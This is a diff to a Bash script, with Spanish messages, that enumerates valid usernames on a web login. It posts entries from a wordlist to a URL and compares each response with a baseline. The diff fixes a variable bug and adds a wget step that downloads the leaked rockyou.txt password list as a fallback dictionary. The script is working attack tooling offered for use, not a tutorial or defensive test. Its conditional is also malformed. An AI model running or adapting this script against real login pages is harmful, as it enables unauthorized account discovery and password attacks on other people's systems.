@@ -25,11 +25,11 @@ then
 else
     if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
-            echo -e "username is $document"
-            username=$test
+            echo -e "El usuario és $document"
+            username=$document
             break 1
         else
-            echo "username incorrecto."
+            echo "Usuario inexistente."
         fi
         ((start = start + 1))
     #    echo $start
@@ -44,9 +44,8 @@ then
 else
     echo "El Fichero no es valido, usaremos un diccionario propio"
     
-    #añadir rockyou.txt
-    
-    document= b.txt
+    wget "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwii7MnruK_3AhW67rsIHY4MDP0QFnoECAcQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd"
+    document= rockyou.txt
 start=1
 total=$(wc -l < $document)
 while [ $start -le $total ]
